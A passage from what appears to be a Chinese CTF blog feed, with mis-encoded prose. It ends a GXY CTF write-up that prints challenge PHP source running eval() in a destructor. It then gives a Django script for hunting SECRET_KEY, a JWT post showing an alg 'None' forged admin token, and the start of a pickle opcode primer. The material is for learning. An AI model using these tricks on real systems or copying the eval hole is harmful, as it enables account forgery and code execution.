rizhan!&lt;br&gt;&lt;br&gt;&#39;;&quot;;        $this-&gt;token = &quot;admin&quot;;    }    function upload($file){        global $sandbox;        global $ext;        if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename)){            $this-&gt;cmd = &quot;die(&#39;illegal filename!&#39;);&quot;;        }        else{            if($file[&#39;size&#39;] &gt; 1024){                $this-&gt;cmd = &quot;die(&#39;you are too big ( :) )&#39;);&quot;;            }            else{                $this-&gt;cmd = &quot;move_uploaded_file(&#39;&quot;.$file[&#39;tmp_name&#39;].&quot;&#39;, &#39;&quot; . $this-&gt;Filename . &quot;&#39;);&quot;;            }        }    }    function __toString(){        global $sandbox;        global $ext;        // return $sandbox.$this-&gt;Filename.$ext;        return $this-&gt;Filename;    }    function __destruct(){        if($this-&gt;token != &quot;admin&quot;){            $this-&gt;cmd = &quot;die(&#39;check token falied!&#39;);&quot;;        }        eval($this-&gt;cmd);        echo &quot;__destruct&quot;;    }}if(isset($_FILES[&#39;file&#39;])) {    $uploader = new Uploader();    $uploader-&gt;upload($_FILES[&quot;file&quot;]);    if(@file_get_contents($uploader)){        echo &quot;æˆåŠŸä¸Šä¼ &lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;;        echo file_get_contents($uploader);    }}?&gt;</code></pre><h2 id="å‚è€ƒ-å…¶ä»–äººçš„wp"><a href="#å‚è€ƒ-å…¶ä»–äººçš„wp" class="headerlink" title="å‚è€ƒ(å…¶ä»–äººçš„wp)"></a>å‚è€ƒ(å…¶ä»–äººçš„wp)</h2><ol><li><a href="http://www.qfrost.com/PWN/GXY_CTF/" target="_blank" rel="noopener">http://www.qfrost.com/PWN/GXY_CTF/</a> </li></ol><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2019/12/22/gxyctf2019/">http://blog.ccreater.top/2019/12/22/gxyctf2019/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
            <tag> çº¿ä¸Šèµ› </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>djangoå¿«é€ŸæŸ¥æ‰¾é…ç½®</title>
      <link href="/2019/12/21/django%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BE%E9%85%8D%E7%BD%AE/"/>
      <url>/2019/12/21/django%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BE%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="djangoå¿«é€ŸæŸ¥æ‰¾é…ç½®"><a href="#djangoå¿«é€ŸæŸ¥æ‰¾é…ç½®" class="headerlink" title="djangoå¿«é€ŸæŸ¥æ‰¾é…ç½®"></a>djangoå¿«é€ŸæŸ¥æ‰¾é…ç½®</h1><h2 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h2><p>åœ¨çœ‹pç‰›çš„picklecode wpçš„æ—¶å€™å¡åœ¨secret_keyæŸ¥æ‰¾é‚£è¾¹</p><p>çœ‹åˆ°pç‰›ä¸€å¥å¾ˆå®¹æ˜“,äººå°±å‚»æ‰äº†</p><p><img src="https://i.loli.net/2019/12/21/8mnp5l7ODuPkBQo.png" alt="image209"></p><p>èŠ±äº†ä¸€å¤©æ—¶é—´(è¸©äº†ä¸ªå‘),å†™äº†ä¸ªå¿«é€ŸæŸ¥æ‰¾secret_keyçš„è„šæœ¬</p><p>ä»£ç å†™çš„ä¸å¤ªå¥½,è‡ªå·±æ”¹æ”¹ç”¨å§////</p><pre><code class="python">from django.http.response import HttpResponse, HttpResponseRedirectfrom django.template import enginesfrom django.contrib.auth import login as auth_login, get_user_model, authenticatefrom django.contrib.auth.views import LoginView, logout_then_loginfrom django.contrib.auth.decorators import login_requiredfrom django.views import genericfrom django import templateimport djangofrom django import templateregister = template.Library()@register.filterdef get_dict(obj,way=&quot;&quot;,depth=0):    if depth&gt;11:        return     objdir=dir(obj)    r={&quot;dict&quot;:objdir,&quot;way&quot;:way}    result=&quot;&quot;    for i in objdir:                    try :            if &#39;_&#39; == i[0]:                continue            if getattr(obj, &#39;__module__&#39;, None)!=None and getattr(obj, &#39;__module__&#39;, None).split(&#39;.&#39;)[0] == django.__name__:                result+=get_dict(getattr(obj,i,None),way+&quot;.&quot;+i,depth+1)         except TypeError:            pass    if &quot;SECRET_KEY&quot; in objdir or &quot;settings&quot; in objdir:        print(way)        return result+way+&quot;\n&quot;    return result</code></pre><p>è¿™ä¸ªæ˜¯æŠŠæ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„éƒ½è¾“å‡º,ä½ å¯ä»¥é€šè¿‡ä¿®æ”¹é€’å½’æ·±åº¦å’Œè¿”å›æ¡ä»¶æ¥åŠ å¿«,ä¸ç„¶è¦ç­‰ä¸ªå‡ åˆ†é’Ÿ</p><h2 id="é¡ºä¾¿è¯´ä¸‹è¸©åˆ°çš„å‘"><a href="#é¡ºä¾¿è¯´ä¸‹è¸©åˆ°çš„å‘" class="headerlink" title="é¡ºä¾¿è¯´ä¸‹è¸©åˆ°çš„å‘"></a>é¡ºä¾¿è¯´ä¸‹è¸©åˆ°çš„å‘</h2><p>å› ä¸ºä¸çŸ¥é“dir()å’Œ<code>__dict__</code>çš„åŒºåˆ«,ä¸€ç›´ä»¥ä¸º<code>__dict__</code>==dir,ç„¶åå°±boomm</p><p>dir()å’Œ<code>__dict__</code>çš„åŒºåˆ«</p><p>æœ€ç®€å•çš„ä¸€å¥å‘\è¯æ˜¯<code>__dict__</code>æ˜¯dirçš„å­é›†åˆ</p><p> <a href="https://stackoverflow.com/questions/13302917/whats-the-difference-between-dirself-and-self-dict/13302981#13302981" target="_blank" rel="noopener">https://stackoverflow.com/questions/13302917/whats-the-difference-between-dirself-and-self-dict/13302981#13302981</a> </p><p>æ‰€ä»¥ä»¥åæŸ¥çœ‹å¯¹è±¡çš„æ‰€æœ‰å±æ€§ä¸€å®šè¦ç”¨dir()</p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2019/12/21/djangoå¿«é€ŸæŸ¥æ‰¾é…ç½®/">http://blog.ccreater.top/2019/12/21/djangoå¿«é€ŸæŸ¥æ‰¾é…ç½®/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> django </tag>
            
            <tag> å°å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jwtæ”»å‡»æ–¹å¼</title>
      <link href="/2019/12/19/jwt%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"/>
      <url>/2019/12/19/jwt%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h1><h2 id="æ–‡ç« "><a href="#æ–‡ç« " class="headerlink" title="æ–‡ç« "></a>æ–‡ç« </h2><p> <a href="https://xz.aliyun.com/t/6776" target="_blank" rel="noopener">https://xz.aliyun.com/t/6776</a></p><p>  <a href="https://www.anquanke.com/post/id/145540" target="_blank" rel="noopener">https://www.anquanke.com/post/id/145540</a> </p><h2 id="å…³äºjwt"><a href="#å…³äºjwt" class="headerlink" title="å…³äºjwt"></a>å…³äºjwt</h2><p>JWTçš„å…¨ç§°æ˜¯Json Web Tokenã€‚å®ƒéµå¾ªJSONæ ¼å¼ï¼Œå°†ç”¨æˆ·ä¿¡æ¯åŠ å¯†åˆ°tokené‡Œï¼ŒæœåŠ¡å™¨ä¸ä¿å­˜ä»»ä½•ç”¨æˆ·ä¿¡æ¯ï¼Œåªä¿å­˜å¯†é’¥ä¿¡æ¯ï¼Œé€šè¿‡ä½¿ç”¨ç‰¹å®šåŠ å¯†ç®—æ³•éªŒè¯tokenï¼Œé€šè¿‡tokenéªŒè¯ç”¨æˆ·èº«ä»½ã€‚åŸºäºtokençš„èº«ä»½éªŒè¯å¯ä»¥æ›¿ä»£ä¼ ç»Ÿçš„cookie+sessionèº«ä»½éªŒè¯æ–¹æ³•ã€‚</p><p>jwtç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼š<code>header</code>.<code>payload</code>.<code>signature</code></p><h3 id="headeréƒ¨åˆ†"><a href="#headeréƒ¨åˆ†" class="headerlink" title="headeréƒ¨åˆ†"></a>headeréƒ¨åˆ†</h3><p>headeréƒ¨åˆ†æœ€å¸¸ç”¨çš„ä¸¤ä¸ªå­—æ®µæ˜¯<code>alg</code>å’Œ<code>typ</code>ï¼Œ<code>alg</code>æŒ‡å®šäº†tokenåŠ å¯†ä½¿ç”¨çš„ç®—æ³•ï¼ˆæœ€å¸¸ç”¨çš„ä¸º<em>HMAC</em>å’Œ<em>RSA</em>ç®—æ³•ï¼‰ï¼Œtyp`å£°æ˜ç±»å‹ä¸ºJWT</p><p>headeré€šå¸¸ä¼šé•¿è¿™ä¸ªæ ·å­ï¼š</p><pre><code>{        &quot;alg&quot; : &quot;HS256&quot;,        &quot;typ&quot; : &quot;jwt&quot;}</code></pre><h3 id="payloadéƒ¨åˆ†"><a href="#payloadéƒ¨åˆ†" class="headerlink" title="payloadéƒ¨åˆ†"></a>payloadéƒ¨åˆ†</h3><p>payloadåˆ™ä¸ºç”¨æˆ·æ•°æ®ä»¥åŠä¸€äº›å…ƒæ•°æ®æœ‰å…³çš„å£°æ˜ï¼Œç”¨ä»¥å£°æ˜æƒé™ï¼Œä¸¾ä¸ªä¾‹å­ï¼Œä¸€æ¬¡ç™»å½•çš„è¿‡ç¨‹å¯èƒ½ä¼šä¼ é€’ä»¥ä¸‹æ•°æ®</p><pre><code>{        &quot;user_role&quot; : &quot;finn&quot;,    //å½“å‰ç™»å½•ç”¨æˆ·    &quot;iss&quot;: &quot;admin&quot;,          //è¯¥JWTçš„ç­¾å‘è€…    &quot;iat&quot;: 1573440582,        //ç­¾å‘æ—¶é—´    &quot;exp&quot;: 1573940267,        //è¿‡æœŸæ—¶é—´    &quot;nbf&quot;: 1573440582,         //è¯¥æ—¶é—´ä¹‹å‰ä¸æ¥æ”¶å¤„ç†è¯¥Token    &quot;domain&quot;: &quot;example.com&quot;,   //é¢å‘çš„ç”¨æˆ·    &quot;jti&quot;: &quot;dff4214121e83057655e10bd9751d657&quot;   //Tokenå”¯ä¸€æ ‡è¯†}</code></pre><h3 id="signatureéƒ¨åˆ†"><a href="#signatureéƒ¨åˆ†" class="headerlink" title="signatureéƒ¨åˆ†"></a>signatureéƒ¨åˆ†</h3><p>signatureçš„åŠŸèƒ½æ˜¯ä¿æŠ¤tokenå®Œæ•´æ€§ã€‚</p><p>ç”Ÿæˆæ–¹æ³•ä¸ºå°†headerå’Œpayloadä¸¤ä¸ªéƒ¨åˆ†è”ç»“èµ·æ¥ï¼Œç„¶åé€šè¿‡headeréƒ¨åˆ†æŒ‡å®šçš„ç®—æ³•ï¼Œè®¡ç®—å‡ºç­¾åã€‚</p><p>æŠ½è±¡æˆå…¬å¼å°±æ˜¯</p><pre><code>signature = HMAC-SHA256(base64urlEncode(header) + &#39;.&#39; + base64urlEncode(payload), secret_key)</code></pre><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç¼–ç headerå’Œpayloadæ—¶ä½¿ç”¨çš„ç¼–ç æ–¹å¼ä¸º<code>base64urlencode</code>ï¼Œ<code>base64url</code>ç¼–ç æ˜¯<code>base64</code>çš„ä¿®æ”¹ç‰ˆï¼Œä¸ºäº†æ–¹ä¾¿åœ¨ç½‘ç»œä¸­ä¼ è¾“ä½¿ç”¨äº†ä¸åŒçš„ç¼–ç è¡¨ï¼Œå®ƒä¸ä¼šåœ¨æœ«å°¾å¡«å……â€=â€å·ï¼Œå¹¶å°†æ ‡å‡†Base64ä¸­çš„â€+â€å’Œâ€/â€œåˆ†åˆ«æ”¹æˆäº†â€-â€œå’Œâ€-â€œã€‚</p><h3 id="å®Œæ•´tokenç”Ÿæˆ"><a href="#å®Œæ•´tokenç”Ÿæˆ" class="headerlink" title="å®Œæ•´tokenç”Ÿæˆ"></a>å®Œæ•´tokenç”Ÿæˆ</h3><p>ä¸€ä¸ªå®Œæ•´çš„jwtæ ¼å¼ä¸º(<code>header</code>.<code>payload</code>.<code>signature</code>)ï¼Œå…¶ä¸­headerã€payloadä½¿ç”¨base64urlç¼–ç ï¼Œsignatureé€šè¿‡æŒ‡å®šç®—æ³•ç”Ÿæˆã€‚</p><p>pythonçš„<code>Pyjwt</code>ä½¿ç”¨ç¤ºä¾‹å¦‚ä¸‹</p><pre><code>import jwtencoded_jwt = jwt.encode({&#39;user_name&#39;: &#39;admin&#39;}, &#39;key&#39;, algorithm=&#39;HS256&#39;)print(encoded_jwt)print(jwt.decode(encoded_jwt, &#39;key&#39;, algorithms=[&#39;HS256&#39;]))</code></pre><p>ç”Ÿæˆçš„tokenä¸º</p><pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`.`eyJ1c2VyX25hbWUiOiJhZG1pbiJ9.oL5szC7mFoJ_7FI9UVMcKfmisqr6Qlo1dusps5wOUlo</code></pre><h2 id="æ”»å‡»æ–¹å¼"><a href="#æ”»å‡»æ–¹å¼" class="headerlink" title="æ”»å‡»æ–¹å¼"></a>æ”»å‡»æ–¹å¼</h2><h3 id="åŠ å¯†ç®—æ³•"><a href="#åŠ å¯†ç®—æ³•" class="headerlink" title="åŠ å¯†ç®—æ³•"></a>åŠ å¯†ç®—æ³•</h3><h4 id="ç©ºåŠ å¯†ç®—æ³•"><a href="#ç©ºåŠ å¯†ç®—æ³•" class="headerlink" title="ç©ºåŠ å¯†ç®—æ³•"></a>ç©ºåŠ å¯†ç®—æ³•</h4><p>JWTæ”¯æŒä½¿ç”¨ç©ºåŠ å¯†ç®—æ³•ï¼Œå¯ä»¥åœ¨headerä¸­æŒ‡å®šalgä¸º<code>None</code></p><p>è¿™æ ·çš„è¯ï¼Œåªè¦æŠŠsignatureè®¾ç½®ä¸ºç©ºï¼ˆå³ä¸æ·»åŠ signatureå­—æ®µï¼‰ï¼Œæäº¤åˆ°æœåŠ¡å™¨ï¼Œä»»ä½•tokenéƒ½å¯ä»¥é€šè¿‡æœåŠ¡å™¨çš„éªŒè¯ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œä½¿ç”¨ä»¥ä¸‹çš„å­—æ®µ</p><pre><code>{    &quot;alg&quot; : &quot;None&quot;,    &quot;typ&quot; : &quot;jwt&quot;}{    &quot;user&quot; : &quot;Admin&quot;}</code></pre><p>ç”Ÿæˆçš„å®Œæ•´tokenä¸º<code>ew0KCSJhbGciIDogIk5vbmUiLA0KCSJ0eXAiIDogImp3dCINCn0.ew0KCSJ1c2VyIiA6ICJBZG1pbiINCn0</code></p><p>(header+â€™.â€™+payloadï¼Œå»æ‰äº†â€™.â€™+signatureå­—æ®µ)</p><p>ç©ºåŠ å¯†ç®—æ³•çš„è®¾è®¡åˆè¡·æ˜¯ç”¨äºè°ƒè¯•çš„ï¼Œä½†æ˜¯å¦‚æœæŸå¤©å¼€å‘äººå‘˜è„‘é˜”ç“¦ç‰¹äº†ï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­å¼€å¯äº†ç©ºåŠ å¯†ç®—æ³•ï¼Œç¼ºå°‘ç­¾åç®—æ³•ï¼Œjwtä¿è¯ä¿¡æ¯ä¸è¢«ç¯¡æ”¹çš„åŠŸèƒ½å°±å¤±æ•ˆäº†ã€‚æ”»å‡»è€…åªéœ€è¦æŠŠalgå­—æ®µè®¾ç½®ä¸ºNoneï¼Œå°±å¯ä»¥åœ¨payloadä¸­æ„é€ èº«ä»½ä¿¡æ¯ï¼Œä¼ªé€ ç”¨æˆ·èº«ä»½ã€‚</p><h4 id="ä¿®æ”¹RSAåŠ å¯†ç®—æ³•ä¸ºHMAC"><a href="#ä¿®æ”¹RSAåŠ å¯†ç®—æ³•ä¸ºHMAC" class="headerlink" title="ä¿®æ”¹RSAåŠ å¯†ç®—æ³•ä¸ºHMAC"></a>ä¿®æ”¹RSAåŠ å¯†ç®—æ³•ä¸ºHMAC</h4><h3 id="çˆ†ç ´"><a href="#çˆ†ç ´" class="headerlink" title="çˆ†ç ´"></a>çˆ†ç ´</h3><p>å·¥å…· <a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2019/12/19/jwtæ”»å‡»æ–¹å¼/">http://blog.ccreater.top/2019/12/19/jwtæ”»å‡»æ–¹å¼/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python  pickle å…¥é—¨</title>
      <link href="/2019/12/16/pickle/"/>
      <url>/2019/12/16/pickle/</url>
      
        <content type="html"><![CDATA[<h1 id="python-pickle"><a href="#python-pickle" class="headerlink" title="python pickle"></a>python pickle</h1><h2 id="æ¨èæ–‡ç« "><a href="#æ¨èæ–‡ç« " class="headerlink" title="æ¨èæ–‡ç« "></a>æ¨èæ–‡ç« </h2><p> <a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a> </p><p>zç‰›: <a href="https://www.anquanke.com/post/id/188981" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188981</a> </p><h2 id="pickleæ“ä½œç å¤§å…¨-v0"><a href="#pickleæ“ä½œç å¤§å…¨-v0" class="headerlink" title="pickleæ“ä½œç å¤§å…¨(v0)"></a>pickleæ“ä½œç å¤§å…¨(v0)</h2><p>æœ‰å•¥ä¸æ‡‚çš„ç›´æ¥çœ‹æºç æŠŠ(zç‰›)</p><pre><code class="python">MARK           = b&#39;(&#39;   # push special markobject on stackSTOP           = b&#39;.&#39;   # every pickle ends with STOPPOP            = b&#39;0&#39;   # discard topmost stack itemPOP_MARK       = b&#39;1&#39;   # discard stack top through topmost markobjectDUP            = b&#39;2&#39;   # duplicate top stack itemFLOAT          = b&#39;F&#39;   # push float object; decimal string argumentINT            = b&#39;I&#39;   # push integer or bool; decimal string argumentBININT         = b&#39;J&#39;   # push four-byte signed intBININT1        = b&#39;K&#39;   # push 1-byte unsigned intLONG           = b&#39;L&#39;   # push long; decimal string argumentBININT2        = b&#39;M&#39;   # push 2-byte unsigned intNONE           = b&#39;N&#39;   # push NonePERSID         = b&#39;P&#39;   # push persistent object; id is taken from string argBINPERSID      = b&#39;Q&#39;   #  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stackREDUCE         = b&#39;R&#39;   # apply callable to argtuple, both on stackSTRING         = b&#39;S&#39;   # push string; NL-terminated string argumentBINSTRING      = b&#39;T&#39;   # push string; counted binary string argumentSHORT_BINSTRING= b&#39;U&#39;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytesUNICODE        = b&#39;V&#39;   # push Unicode string; raw-unicode-escaped&#39;d argumentBINUNICODE     = b&#39;X&#39;   #   &quot;     &quot;       &quot;  ; counted UTF-8 string argumentAPPEND         = b&#39;a&#39;   # append stack top to list below itBUILD          = b&#39;b&#39;   # call __setstate__ or __dict__.update()GLOBAL         = b&#39;c&#39;   # push self.find_class(modname, name); 2 string argsDICT           = b&#39;d&#39;   # build a dict from stack itemsEMPTY_DICT     = b&#39;}&#39;   # push empty dictAPPENDS        = b&#39;e&#39;   # extend list on stack by topmost stack sliceGET            = b&#39;g&#39;   # push item from memo on stack; index is string argBINGET         = b&#39;h&#39;   #   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte argINST           = b&#39;i&#39;   # build &amp; push class instanceLONG_BINGET    = b&#39;j&#39;   # push item from memo on stack; index is 4-byte argLIST           = b&#39;l&#39;   # build list from topmost stack itemsEMPTY_LIST     = b&#39;]&#39;   # push empty listOBJ            = b&#39;o&#39;   # build &amp; push class instancePUT            = b&#39;p&#39;   # store stack top in memo; index is string argBINPUT         = b&#39;q&#39;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte argLONG_BINPUT    = b&#39;r&#39;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte argSETITEM        = b&#39;s&#39;   # add key+value pair to dictTUPLE          = b&#39;t&#39;   # build tuple from topmost stack itemsEMPTY_TUPLE    = b&#39;)&#39;   # push empty tupleSETITEMS       = b&#39;u&#39;   # modify dict by adding topmost key+value pairsBINFLOAT       = b&#39;G&#39;   # push float; arg is 8-byte float encodingTRUE           = b&#39;I01\n&#39;  # not an opcode; see INT docs in pickletools.pyFALSE          = b&#39;I00\n&#39;  # not an opcode; see INT docs in pickletools.py</code></pre><h2 id="pickleä»‹ç»"><a href="#pickleä»‹ç»" class="headerlink" title="pickleä»‹ç»"></a>pickleä»‹ç»</h2><h3 id="pickleçš„å¤§è‡´è¿‡ç¨‹"><a href="#pickleçš„å¤§è‡´è¿‡ç¨‹" class="headerlink" title="pickleçš„å¤§è‡´è¿‡ç¨‹"></a>pickleçš„å¤§è‡´è¿‡ç¨‹</h3><p>ä»¥Fooç±»ä¸ºä¾‹</p><ol><li>æå–å‡ºFooç±»ä¸­çš„æ‰€æœ‰attribute(ä»<code>__dict__</code>ä¸­è·å¾—)å°†å…¶è½¬åŒ–ä¸ºé”®å€¼å¯¹</li><li>å†™å…¥å¯¹è±¡ç±»å</li><li>å†™å…¥ç¬¬ä¸€æ­¥ç”Ÿæˆçš„é”®å€¼å¯¹</li></ol><h3 id="unpickleçš„å¤§è‡´è¿‡ç¨‹"><a href="#unpickleçš„å¤§è‡´è¿‡ç¨‹" class="headerlink" title="unpickleçš„å¤§è‡´è¿‡ç¨‹"></a>unpickleçš„å¤§è‡´è¿‡ç¨‹</h3><ol><li>è·å–pickleæµ</li><li>é‡æ–°æ„å»ºå±æ€§åˆ—è¡¨</li><li>æ ¹æ®ä¿å­˜çš„ç±»åæ¥åˆ›å»ºå¯¹è±¡</li><li>å°†å±æ€§åˆ—è¡¨æ¢å¤åˆ°å¯¹è±¡ä¸­</li></ol><h3 id="pvmç»„æˆ-è§£æpickle"><a href="#pvmç»„æˆ-è§£æpickle" class="headerlink" title="pvmç»„æˆ(è§£æpickle)"></a>pvmç»„æˆ(è§£æpickle)</h3><ol><li>æŒ‡ä»¤è§£é‡Šå™¨<br>æœ€åä¸€æ­¥ä¸€å®šæ˜¯è¿”å›æ ˆé¡¶å…ƒç´ </li><li>æ ˆ </li><li>memo(ä¸´æ—¶ä¿å­˜æ•°æ®)<br>ç”¨ç±»ä¼¼listçš„æ–¹å¼æ¥è¯»å–å’Œå‚¨å­˜æ•°æ®,ä»¥å­—å…¸æ–¹å¼å®ç°<br>å¦‚p100,æ„ä¸ºæŠŠæ ˆé¡¶å…ƒç´ ä¿å­˜åˆ°memoä¸­ç´¢å¼•ä¸º100</li></ol><h3 id="pvmæŒ‡ä»¤æ ¼å¼"><a href="#pvmæŒ‡ä»¤æ ¼å¼" class="headerlink" title="pvmæŒ‡ä»¤æ ¼å¼"></a>pvmæŒ‡ä»¤æ ¼å¼</h3><ol><li><p>pvmçš„æ“ä½œç åªæœ‰ä¸€ä¸ªå­—èŠ‚</p></li><li><p>éœ€è¦å‚æ•°çš„æ“ä½œç ,è¦åœ¨æ¯ä¸€ä¸ªå‚æ•°åé¢åŠ ä¸Šæ¢è¡Œç¬¦</p></li><li><p>ä»pickleæµä¸­è¯»å–æ•°æ®,å¹¶åŠ è½½åˆ°æ ˆä¸Š</p></li></ol><h2 id="å¦‚ä½•ç”Ÿæˆpickle"><a href="#å¦‚ä½•ç”Ÿæˆpickle" class="headerlink" title="å¦‚ä½•ç”Ÿæˆpickle"></a>å¦‚ä½•ç”Ÿæˆpickle</h2><h3 id="æ“ä½œç "><a href="#æ“ä½œç " class="headerlink" title="æ“ä½œç "></a>æ“ä½œç </h3><h4 id="åŠ è½½æ•°æ®"><a href="#åŠ è½½æ•°æ®" class="headerlink" title="åŠ è½½æ•°æ®"></a>åŠ è½½æ•°æ®</h4><table><thead><tr><th>æ“ä½œç </th><th>åŠ©è®°</th><th>åŠ è½½åˆ°æ ˆä¸Šçš„æ•°æ®ç±»å‹</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>S</td><td>string</td><td>String</td><td>Sâ€™fooâ€™\n</td></tr><tr><td>V</td><td>unicode</td><td>unicode</td><td>Vfo\u006f\n</td></tr><tr><td>I</td><td>int</td><td>int</td><td>I42\n</td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><h4 id="ä¿®æ”¹æ ˆ-memo"><a href="#ä¿®æ”¹æ ˆ-memo" class="headerlink" title="ä¿®æ”¹æ ˆ/memo"></a>ä¿®æ”¹æ ˆ/memo</h4><table><thead><tr><th>æ“ä½œç </th><th>åŠ©è®°</th><th>æè¿°</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>(</td><td>MARK</td><td>å‘æ ˆä¸­åŠ å…¥ä¸€ä¸ªæ ‡è®°</td><td>(</td></tr><tr><td>0</td><td>POP</td><td>å¼¹å‡ºæ ˆé¡¶å…ƒç´ å¹¶ä¸¢å¼ƒ</td><td>0</td></tr><tr><td>p<code>&lt;memo_index&gt;</code>\n</td><td>PUT</td><td>å¤åˆ¶æ ˆé¡¶å…ƒç´ åˆ°memoä¸­</td><td>p101\n</td></tr><tr><td>g<code>&lt;memo_index&gt;</code>\n</td><td>GET</td><td>å°†memoä¸­æŒ‡å®šå…ƒç´ æ‹·è´åˆ°æ ˆé¡¶</td><td>g101\n</td></tr></tbody></table><h4 id="ç”Ÿæˆ-ä¿®æ”¹åˆ—è¡¨-å­—å…¸-å…ƒç»„"><a href="#ç”Ÿæˆ-ä¿®æ”¹åˆ—è¡¨-å­—å…¸-å…ƒç»„" class="headerlink" title="ç”Ÿæˆ/ä¿®æ”¹åˆ—è¡¨,å­—å…¸,å…ƒç»„"></a>ç”Ÿæˆ/ä¿®æ”¹åˆ—è¡¨,å­—å…¸,å…ƒç»„</h4><table><thead><tr><th>æ“ä½œç </th><th>åŠ©è®°</th><th>æè¿°</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>l</td><td>åˆ—è¡¨</td><td>å°†æ ˆé¡¶åˆ°é‡åˆ°çš„ç¬¬ä¸€ä¸ªmaskä¹‹é—´çš„å…ƒç´ åˆ°ä¸€ä¸ªåˆ—è¡¨,å¹¶å°†è¿™ä¸ªåˆ—è¡¨æ”¾å…¥æ ˆä¸­</td><td>(Sâ€™stringâ€™\nl</td></tr><tr><td>t</td><td>å…ƒç»„</td><td>å°†æ ˆé¡¶åˆ°é‡åˆ°çš„ç¬¬ä¸€ä¸ªmaskä¹‹é—´çš„å…ƒç´ æ”¾åˆ°ä¸€ä¸ªå…ƒç»„ä¸­,å¹¶å°†è¿™ä¸ªå…ƒç»„æ”¾å…¥æ ˆä¸­</td><td>(Sâ€™stringâ€™\nSâ€™string2â€™\nt</td></tr><tr><td>d</td><td>å­—å…¸</td><td>å°†æ ˆé¡¶åˆ°é‡åˆ°çš„ç¬¬ä¸€ä¸ªmaskä¹‹é—´çš„å…ƒç´ æ”¾åˆ°ä¸€ä¸ªå­—å…¸ä¸­,å¹¶å°†è¿™ä¸ªå­—å…¸æ”¾å…¥æ ˆä¸­</td><td>(Sâ€™key1â€™\nSâ€™value1â€™\nSâ€™key2â€™\nSâ€™value2â€™\nd</td></tr><tr><td>s</td><td>SETITEM</td><td>ä»æ ˆå‡ºå¼¹å‡ºä¸‰ä¸ªå€¼:å­—å…¸,é”®,å€¼,å°†é”®å€¼å¯¹åˆå¹¶åˆ°å­—å…¸ä¸­</td><td>(Sâ€™key1â€™\nSâ€™val1â€™\nSâ€™key2â€™\nI123\ndSâ€™key3â€™\nSâ€™val 3â€™\ns</td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><h4 id="pickle-æµç”Ÿæˆå…ƒç»„çš„è¿‡ç¨‹"><a href="#pickle-æµç”Ÿæˆå…ƒç»„çš„è¿‡ç¨‹" class="headerlink" title="pickle æµç”Ÿæˆå…ƒç»„çš„è¿‡ç¨‹"></a>pickle 